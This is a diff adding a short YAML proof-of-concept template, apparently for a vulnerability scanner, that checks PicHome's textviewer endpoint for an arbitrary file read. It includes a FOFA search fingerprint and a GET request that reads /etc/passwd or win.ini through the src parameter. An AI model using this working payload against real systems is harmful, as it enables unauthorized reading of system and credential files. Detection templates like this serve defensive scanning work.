@@ -1,0 +1,21 @@
+id: poc-yaml-oaooa-pichome-textviewer-anyfile-read
+info:
+  name: 欧澳PicHome textviewer 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: pichome
+  fofa: app="欧澳图文-欧澳PicHome"
+variables:
+  paths: 'C:/Windows/win.ini
+
+    /etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /index.php?mod=textviewer&op=index&src={{.paths}}
+  expression: (status_code == 200 && contains(headers,"textviewer")) && ( (contains(body,"root:")
+    && contains(body,"/bin")) || (contains(body,"[files]") && contains(body,"bit app
+    support")) )
+transport: http
